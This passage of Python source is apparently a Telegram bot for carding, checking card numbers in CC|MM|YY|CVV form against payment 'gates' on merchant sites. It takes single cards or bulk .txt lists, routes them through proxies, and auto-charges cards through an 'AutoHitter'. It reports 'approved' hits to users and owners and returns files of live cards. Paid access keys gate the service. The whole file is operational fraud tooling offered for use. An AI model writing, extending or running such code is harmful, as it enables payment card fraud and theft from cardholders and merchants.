                        f"Site: <code>{merchant}</code>\n"
                        f"<code>{bar}</code> {pct}%\n\n"
                        f"Progress: <code>{i+1}/{total}</code>\n"
                        f"Speed: <code>{cpm} CPM</code>\n\n"
                        f"✅ Approved: <code>{successes}</code>\n"
                        f"❌ Failed: <code>{fails}</code>",
                        reply_markup=markup)

            loop.close()
            cancel_flags.pop(user_id, None)

            send_message(chat_id,
                f"⍟━━━⌁ <b>AutoHitter Complete</b> ⌁━━━⍟\n\n"
                f"Total: <code>{total}</code>\n"
                f"✅ Approved: <code>{successes}</code>\n"
                f"❌ Failed: <code>{fails}</code>")

            if approved_list:
                filename = f"autohitter_hits_{int(time.time())}.txt"
                filepath = os.path.join(DATA_DIR, filename)
                with open(filepath, "w") as f:
                    for e in approved_list:
                        f.write(e + "\n")
                send_document(chat_id, filepath)

            with active_lock:
                active_users.discard(user_id)

        threading.Thread(target=_run_autohitter, daemon=True).start()
        return

    # --- /filesend ---
    if text.startswith("/filesend"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        reply = msg.get("reply_to_message")
        doc = None
        if msg.get("document"):
            doc = msg["document"]
        elif reply and reply.get("document"):
            doc = reply["document"]
        if not doc:
            send_message(chat_id,
                f"⍟━━━⌁ <b>File Send</b> ⌁━━━⍟\n\n"
                "Attach a file with <code>/filesend</code> or reply to a file.")
            return
        file_name = doc.get("file_name", f"file_{int(time.time())}")
        file_size = doc.get("file_size", 0)
        file_id = doc.get("file_id")
        if not file_id:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nCould not get file ID.")
            return
        send_message(chat_id, f"Downloading <code>{file_name}</code>...")

        def _save_file():
            try:
                content = download_file(file_id, binary=True)
                if not content:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to download.")
                    return
                filesent_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "filesent")
                os.makedirs(filesent_dir, exist_ok=True)
                save_path = os.path.join(filesent_dir, file_name)
                if os.path.exists(save_path):
                    name, ext = os.path.splitext(file_name)
                    save_path = os.path.join(filesent_dir, f"{name}_{int(time.time())}{ext}")
                if isinstance(content, str):
                    with open(save_path, "w", encoding="utf-8") as f:
                        f.write(content)
                else:
                    with open(save_path, "wb") as f:
                        f.write(content)
                send_message(chat_id,
                    f"⍟━━━⌁ <b>File Saved</b> ⌁━━━⍟\n\n"
                    f"Name: <code>{os.path.basename(save_path)}</code>\n"
                    f"Size: <code>{file_size / 1024:.1f} KB</code>")
            except Exception as e:
                send_message(chat_id, f"⍟━━━⌁ <b>Error:</b> {str(e)[:80]} ⌁━━━⍟")
        threading.Thread(target=_save_file, daemon=True).start()
        return

    # --- /adminkey ---
    if text.startswith("/adminkey"):
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOwner only.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/adminkey 123456789 7d</code>")
            return
        target_id = parts[1].strip()
        if not target_id.isdigit():
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid user ID.")
            return
        duration_seconds = None
        if len(parts) >= 3:
            parsed = parse_duration(parts[2])
            if parsed == -1:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
                return
            duration_seconds = parsed
        admins = _load_json(ADMINS_FILE, {})
        entry = {"promoted_by": user_id, "promoted_at": time.time()}
        if duration_seconds is not None:
            entry["expires_at"] = time.time() + duration_seconds
        else:
            entry["expires_at"] = None
        admins[target_id] = entry
        _save_json(ADMINS_FILE, admins)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        send_message(chat_id,
            f"⍟━━━⌁ <b>Admin Granted</b> ⌁━━━⍟\n\n"
            f"User: <code>{target_id}</code>\nDuration: <code>{dur_label}</code>")
        return

    # --- /adminlist ---
    if text == "/adminlist":
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOwner only.")
            return
        admins = _load_json(ADMINS_FILE, {})
        lines_out = []
        now = time.time()
        for uid, entry in admins.items():
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid}  ·  {exp}")
        for oid in ADMIN_IDS:
            lines_out.insert(0, f"  {oid}  ·  Owner (permanent)")
        send_message(chat_id,
            f"⍟━━━⌁ <b>Admins ({len(lines_out)})</b> ⌁━━━⍟\n\n"
            "<code>" + "\n".join(lines_out) + "</code>")
        return

    # --- /chkapi* ---
    if text in CHKAPI_CMDS:
        if not is_admin(user_id):
            return
        gate_key = CHKAPI_CMDS[text]
        gate_info = GATE_PROBE_MAP.get(gate_key, {})
        gate_name = gate_info.get("name", gate_key)
        currently_enabled = is_gate_enabled(gate_key)

        send_message(chat_id, f"Probing {gate_name}...")
        alive, latency, detail = probe_gate(gate_key)

        if alive:
            status_line = f"<b>ALIVE</b> — {latency}ms"
            buttons = {"inline_keyboard": [[
                {"text": "Disable", "callback_data": f"gate_off_{gate_key}"},
                {"text": "Keep", "callback_data": "gate_keep"},
            ]]}
        else:
            status_line = f"<b>DEAD</b> — {detail}"
            if currently_enabled:
                buttons = {"inline_keyboard": [[
                    {"text": "Disable", "callback_data": f"gate_off_{gate_key}"},
                    {"text": "Keep", "callback_data": "gate_keep"},
                ]]}
            else:
                buttons = {"inline_keyboard": [[
                    {"text": "Re-enable", "callback_data": f"gate_on_{gate_key}"},
                    {"text": "Keep off", "callback_data": "gate_keep"},
                ]]}

        enabled_label = "Enabled" if currently_enabled else "Disabled"
        send_message(chat_id,
            f"⍟━━━⌁ <b>API Check — {gate_name}</b> ⌁━━━⍟\n\n"
            f"Status: {status_line}\n"
            f"Detail: <code>{detail}</code>\n"
            f"Latency: <code>{latency}ms</code>\n"
            f"Currently: {enabled_label}",
            reply_markup=buttons)
        return

    # --- /chkapis ---
    if text == "/chkapis":
        if not is_admin(user_id):
            return
        send_message(chat_id, "Checking all gates...")
        lines_out = [f"⍟━━━⌁ <b>API Health Report</b> ⌁━━━⍟\n"]
        any_dead = []
        for gate_key, info in GATE_PROBE_MAP.items():
            alive, latency, detail = probe_gate(gate_key)
            enabled = is_gate_enabled(gate_key)
            if alive:
                status = f"Alive ({latency}ms)"
            else:
                status = f"Dead — {detail}"
                any_dead.append(gate_key)
            en_text = "On" if enabled else "Off"
            lines_out.append(
                f"<code>{info['cmd']}</code> — {info['name']}\n    {status}  ·  {en_text}")
        if any_dead:
            lines_out.append(f"\n<b>{len(any_dead)} dead gate(s)</b>")
        else:
            lines_out.append(f"\n<b>All gates operational</b>")
        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /gates ---
    if text == "/gates":
        gs = load_gate_stats()
        lines_out = [f"⍟━━━⌁ <b>Auth Gates</b> ⌁━━━⍟\n"]
        for key, cmd, label, live in AUTH_GATES:
            enabled = is_gate_enabled(key)
            status_text = "Live" if (live and enabled) else ("Disabled" if not enabled else "Soon")
            s = gs.get(key, {})
            total = s.get("total", 0)
            approved = s.get("approved", 0)
            rate = round((approved / total) * 100, 1) if total > 0 else 0
            lines_out.append(
                f"<code>{cmd}</code>  ·  {label}\n    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")

        lines_out.append(f"\n⍟━━━⌁ <b>Charge Gates</b> ⌁━━━⍟\n")
        for key, cmd, label, live in CHARGE_GATES:
            enabled = is_gate_enabled(key)
            status_text = "Live" if (live and enabled) else ("Disabled" if not enabled else "Soon")
            s = gs.get(key, {})
            total = s.get("total", 0)
            approved = s.get("approved", 0)
            rate = round((approved / total) * 100, 1) if total > 0 else 0
            lines_out.append(
                f"<code>{cmd}</code>  ·  {label}\n    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")

        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /stats ---
    if text == "/stats":
        send_message(chat_id, fmt_stats(user_id))
        return

    # --- /mykey ---
    if text == "/mykey":
        send_message(chat_id, fmt_mykey(user_id))
        return

    # --- /genkey ---
    if text.startswith("/genkey") and not text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
            return
        parts = text.split()
        line_limit = None
        duration_seconds = None
        if len(parts) >= 2:
            try:
                line_limit = int(parts[1])
                if len(parts) >= 3:
                    parsed = parse_duration(parts[2])
                    if parsed == -1:
                        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
                        return
                    duration_seconds = parsed
            except ValueError:
                parsed = parse_duration(parts[1])
                if parsed == -1:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/genkey [limit] [duration]</code>")
                    return
                duration_seconds = parsed
        key = generate_key()
        keys = load_keys()
        keys[key] = {
            "created_by": user_id, "created_at": time.time(),
            "used": False, "duration": duration_seconds, "line_limit": line_limit,
        }
        save_keys(keys)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id,
            f"⍟━━━⌁ <b>Key Generated</b> ⌁━━━⍟\n\n"
            f"<code>{key}</code>\n"
            f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>")
        return

    # --- /genkeys ---
    if text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/genkeys 10 500 7d</code>")
            return
        try:
            count = int(parts[1])
        except ValueError:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid count.")
            return
        if count < 1 or count > 500:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nCount must be 1-500.")
            return
        line_limit = None
        duration_seconds = None
        if len(parts) >= 3:
            try:
                line_limit = int(parts[2])
                if len(parts) >= 4:
                    parsed = parse_duration(parts[3])
                    if parsed == -1:
                        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
                        return
                    duration_seconds = parsed
            except ValueError:
                parsed = parse_duration(parts[2])
                if parsed == -1:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid format.")
                    return
                duration_seconds = parsed
        keys = load_keys()
        generated = []
        for _ in range(count):
            key = generate_key()
            keys[key] = {
                "created_by": user_id, "created_at": time.time(),
                "used": False, "duration": duration_seconds, "line_limit": line_limit,
            }
            generated.append(key)
        save_keys(keys)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        filename = f"keys_{count}x_{int(time.time())}.txt"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, "w") as f:
            for k in generated:
                f.write(k + "\n")
        send_document(chat_id, filepath, filename,
            caption=f"⍟━━━⌁ <b>{count} Keys Generated</b> ⌁━━━⍟\n"
                    f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>")
        return

    # --- /revoke ---
    if text.startswith("/revoke"):
        if not is_admin(user_id):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/revoke 123456789</code>")
            return
        target_id = parts[1].strip()
        users = load_users()
        if target_id in users:
            del users[target_id]
            save_users(users)
            send_message(chat_id, f"⍟━━━⌁ <b>Access Revoked</b> ⌁━━━⍟\n\nUser <code>{target_id}</code> removed.")
        else:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nUser not found.")
        return

    # --- /authlist ---
    if text == "/authlist":
        if not is_admin(user_id):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
            return
        users = load_users()
        if not users:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo authorized users.")
            return
        lines_out = []
        now = time.time()
        for uid, entry in users.items():
            key = entry.get("key", "N/A")
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid}  ·  {key[:10]}...  ·  {exp}")
        send_message(chat_id,
            f"⍟━━━⌁ <b>Authorized Users ({len(users)})</b> ⌁━━━⍟\n\n"
            "<code>" + "\n".join(lines_out) + "</code>")
        return

    # --- /broadcast ---
    if text.startswith("/broadcast"):
        if not is_admin(user_id):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> /broadcast Your message")
            return
        broadcast_text = parts[1]
        users = load_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                resp = send_message(int(uid), f"⍟━━━⌁ <b>Broadcast</b> ⌁━━━⍟\n\n{broadcast_text}")
                if resp.get("ok"):
                    sent += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
        send_message(chat_id,
            f"⍟━━━⌁ <b>Broadcast Complete</b> ⌁━━━⍟\n\n"
            f"Sent: <code>{sent}</code>\nFailed: <code>{failed}</code>")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/redeem YOUR-KEY</code>")
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid key.")
            return
        if keys[key].get("used"):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nKey already used.")
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)
        duration_seconds = keys[key].get("duration")
        line_limit = keys[key].get("line_limit")
        authorize_user(user_id, key, duration_seconds, line_limit)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id,
            f"⍟━━━⌁ <b>Access Granted</b> ⌁━━━⍟\n\n"
            f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>\n\nWelcome aboard.")
        notify_new_user(user_id, username, f"Duration: {dur_label} | Limit: {limit_label}")
        return

    # --- /authsite (admin) ---
    if text.startswith("/authsite"):
        if not is_admin(user_id):
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            cfg = auth_get_config()
            send_message(chat_id,
                f"⍟━━━⌁ <b>Auth Gate Site</b> ⌁━━━⍟\n\n"
                f"Current: <code>{cfg.get('site_url', 'N/A')}</code>\n\n"
                f"<code>/authsite https://newsite.com</code>")
            return
        new_url = parts[1].strip().rstrip('/')
        if not new_url.startswith(('http://', 'https://')):
            new_url = 'https://' + new_url
        auth_update_config("site_url", new_url)
        send_message(chat_id,
            f"⍟━━━⌁ <b>Auth Site Updated</b> ⌁━━━⍟\n\nNew URL: <code>{new_url}</code>")
        return

    # --- Gate commands ---
    cmd_base = text.split()[0] if text else ""
    if cmd_base in GATE_MAP:
        gate, gate_label = GATE_MAP[cmd_base]

        if not is_gate_enabled(gate):
            send_message(chat_id,
                f"⍟━━━⌁ <b>{gate_label} — Offline</b> ⌁━━━⍟\n\n"
                f"This gate is disabled. Try /gates for available options.")
            return

        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        # Determine gate type for hit format
        is_charge = gate in [g[0] for g in CHARGE_GATES]

        # Single card mode
        parts = text.split(maxsplit=1)
        if len(parts) == 2 and '|' in parts[1]:
            cc_input = parts[1].strip()
            c_data = cc_input.split('|')
            if len(c_data) != 4:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid format. Use: <code>{cmd_base} CC|MM|YY|CVV</code>")
                return

            send_message(chat_id, f"⍟━━━⌁ <b>Checking...</b> ⌁━━━⍟\n<code>{cc_input}</code>")

            def _single_check():
                result = process_single_entry(cc_input, list(_global_proxies) if _global_proxies else [], user_id, gate=gate)
                r_lower = result.lower()
                if r_lower.startswith("approved") or "approved" in r_lower:
                    # Use Hijra hit format
                    hit_msg = _fmt_hit_notification(user_id, username, gate_label, cc_input, result)
                    send_message(chat_id, hit_msg)
                    notify_hit(user_id, username, gate_label, cc_input, result)
                elif "skipped" in r_lower:
                    send_message(chat_id,
                        f"⍟━━━⌁ <b>SKIPPED</b> ⌁━━━⍟\n\n"
                        f"Card: <code>{cc_input}</code>\n"
                        f"Gate: <code>{gate_label}</code>\n"
                        f"Result: {result}")
                else:
                    send_message(chat_id,
                        f"⍟━━━⌁ <b>DECLINED</b> ⌁━━━⍟\n\n"
                        f"Card: <code>{cc_input}</code>\n"
                        f"Gate: <code>{gate_label}</code>\n"
                        f"Result: {result}")

            threading.Thread(target=_single_check, daemon=True).start()
            return

        # Bulk mode
        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
                f"<b>Single:</b> <code>{cmd_base} CC|MM|YY|CVV</code>\n"
                f"<b>Bulk:</b> Reply to a .txt with <code>{cmd_base}</code>")
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOnly .txt files accepted.")
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to download file.")
            return

        file_lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not file_lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFile is empty.")
            return

        user_limit = get_user_line_limit(user_id)
        if user_limit and len(file_lines) > user_limit:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
                f"Your key allows <code>{user_limit}</code> lines. File has <code>{len(file_lines)}</code>.")
            return

        init_resp = send_message(
            chat_id,
            f"⍟━━━⌁ <b>{gate_label}</b> ⌁━━━⍟\n\nStarting...",
            reply_markup=stop_button_markup(user_id)
        )
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run(gate=gate, gate_label=gate_label):
            start_time = time.time()
            last_edit_time = [0]

            def on_progress(idx, total, results, entry, status, detail):
                if status == "APPROVED":
                    status_text = "APPROVED — " + detail
                    hit_msg = _fmt_hit_notification(user_id, username, gate_label, entry,
                                                    detail)
                    send_message(chat_id, hit_msg)
                    notify_hit(user_id, username, gate_label, entry, detail)
                elif status == "DECLINED":
                    status_text = "DECLINED — " + detail
                elif status == "SKIPPED":
                    status_text = "SKIPPED — " + detail
                else:
                    status_text = "ERROR — " + detail

                now = time.time()
                if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
                    last_edit_time[0] = now
                    markup = None if idx == total else stop_button_markup(user_id)
                    edit_message(
                        chat_id,
                        progress_msg_id,
                        fmt_live(idx, total, results, start_time, entry=entry, status_text=status_text, done=(idx == total)),
                        reply_markup=markup)

            def on_complete(results):
                cancel_flags.pop(user_id, None)
                update_user_stats(user_id, results)
                update_gate_stats(gate, results)

                if progress_msg_id:
                    edit_message(
                        chat_id, progress_msg_id,
                        fmt_live(results['total'], results['total'], results, start_time,
                                 entry="Finished", status_text="Completed", done=True))

                send_message(chat_id, fmt_results(results))

                if results["approved_list"]:
                    filename = f"approved_{int(time.time())}.txt"
                    filepath = os.path.join(DATA_DIR, filename)
                    with open(filepath, "w") as f:
                        for e in results["approved_list"]:
                            f.write(e + "\n")
                    send_document(chat_id, filepath)

                with active_lock:
                    active_users.discard(user_id)

            run_processing(file_lines, user_id, on_progress=on_progress, on_complete=on_complete, gate=gate)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — {BOT_NAME}")
    load_global_proxies()
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
